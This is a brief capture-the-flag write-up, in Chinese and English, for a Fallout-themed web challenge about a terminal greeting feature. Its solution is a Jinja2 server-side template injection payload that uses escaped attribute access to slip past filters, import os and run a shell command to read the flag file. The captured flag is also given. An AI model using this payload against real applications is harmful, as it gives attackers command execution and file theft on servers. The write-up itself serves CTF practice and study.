# Vault-Tec Overseer Terminal

## 題目描述

A RobCo Termlink for Vault 101 lets residents personalize a terminal greeting. Enroll as an ordinary resident and recover the Overseer's sealed directive.

## 解題思路

這題就 SSTI，用我之前打 picoCTF 的 payload 即可

```py
{{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x5f\x5fbuiltins\x5f\x5f')|attr('get')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')()}}
```

## Flag

```text
bitctf{{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}}
```
